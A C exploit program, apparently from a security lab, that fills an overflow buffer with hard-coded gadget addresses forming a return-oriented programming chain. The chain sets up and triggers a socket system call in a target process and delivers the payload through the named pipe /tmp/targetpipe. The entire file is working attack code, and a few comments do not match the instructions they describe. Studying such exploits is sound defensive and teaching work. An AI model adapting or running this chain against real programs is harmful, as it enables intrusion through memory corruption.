#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"

int main(void)
{
  char bufr[300]; // address = 0xbfbf671d

  char trap[] = "\xe5\xb6\xa9\xbb";

  char pop_edx[] = "\x1b\xdc\xb9\xbb";
  char pop_ecx[] = "\x22\xa4\xba\xbb";

  char xor_eax[] = "\xc2\xb3\xa9\xbb"; 
  char xor_edx[] = "\xd4\xbe\xb3\xbb";

  char add_dl_al[] = "\x07\x46\xbb\xbb";
  char add_cl_ah[] = "\xd7\xbd\xa7\xbb";
  
  char inc_edx[] = "\x8a\xb8\xb7\xbb";

  char dec_ecx[] = "\x17\xe7\xb7\xbb";

  char write_at_ecx_from_edx[] = "\x7e\xb8\xb6\xbb";

  char dummy_ret[] = "\x9c\x36\xa7\xbb";

  char socket_arg1[] = "\x8a\x01\x01\x01";
  char socket_arg2[] = "\x01\x01\x01\x01";

  char socket_stack_arg1_address[] = "\x04\x68\xbf\xbf"; // -> 2
  char socket_stack_arg2_address[] = "\x08\x68\xbf\xbf"; // -> 1
  char socket_stack_arg3_address[] = "\x0c\x68\xbf\xbf"; // -> 0

  int i;
  // Fill up buffer
  for(i = 0; i < 131; i++)
    memcpy(bufr + i, "\x01",1);

  // get first 8 bits of socket arg-> 8a
  strcpy(bufr + 131, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 135, socket_arg1);
  // get next 8 bits of socket arg-> 01
  strcpy(bufr + 139, pop_ecx); // 0xbbaa422
  strcpy(bufr + 143, socket_arg2);
  // clear eax
  strcpy(bufr + 147, xor_eax); // 0xbba9b3c2
  // add first 8 bits of arg
  strcpy(bufr + 151, add_dl_al); // 0xbbbb4607
  // add next 8 bits of arg
  strcpy(bufr + 155, add_cl_ah); // 0xbba7bdd7
                                 // eax now holds 394-> 18a
  
  // prepare stack with 3 args for socket syscall
  // clear edx
  strcpy(bufr + 159, xor_edx); // 0xbbb3bed4
  // increment ecx to 2
  strcpy(bufr + 163, inc_edx); // 0xbbb7b88a
  strcpy(bufr + 167, inc_edx); // 0xbbb7b88a
  // pop first address of args -> 2
  strcpy(bufr + 171, pop_ecx); // 0xbbaa422 dec_ecx
  strcpy(bufr + 175, socket_stack_arg1_address); // -> 0xbfbf6804
  // dummy gadget
  strcpy(bufr + 179, dummy_ret);
  strcpy(bufr + 183, write_at_ecx_from_edx); // 0xbbb6b87e
  // clear edx
  strcpy(bufr + 187, xor_edx); // 0xbbb3bed4
  // increment edx to 1
  strcpy(bufr + 191, inc_edx); // 0xbbb7b88a
  // pop second address of args -> 1
  strcpy(bufr + 195, pop_ecx); // 0xbbaa422
  strcpy(bufr + 199, socket_stack_arg2_address); // -> 0xbfbf6808
  strcpy(bufr + 203, write_at_ecx_from_edx); // 0xbbb6b87e
  // clear edx
  strcpy(bufr + 207, xor_edx); // 0xbbb3bed4
  // pop third address of args -> 0
  strcpy(bufr + 211, pop_ecx); // 0xbbaa422
  strcpy(bufr + 215, socket_stack_arg3_address); // -> 0xbfbf680c
  strcpy(bufr + 219, write_at_ecx_from_edx); // 0xbbb6b87e

  // trap into the kernel
  strcpy(bufr + 223, trap); 
  // dummy val
  strcpy(bufr + 227, "\xc4\x40\xa7\xbb");
  // socket arg 1 -> 2
  strcpy(bufr + 231, "\x01\x01\x01\x01");
  // socket arg 2 -> 1
  strcpy(bufr + 235, "\x01\x01\x01\x01");
  // socket arg 3 -> 0
  strcpy(bufr + 239, "\x01\x01\x01\x01");
  strcpy(bufr + 243, "\x02\x02\x02\x02"); // test value

  writecmd(PIPEPATH, bufr);
  
  return 0;
}
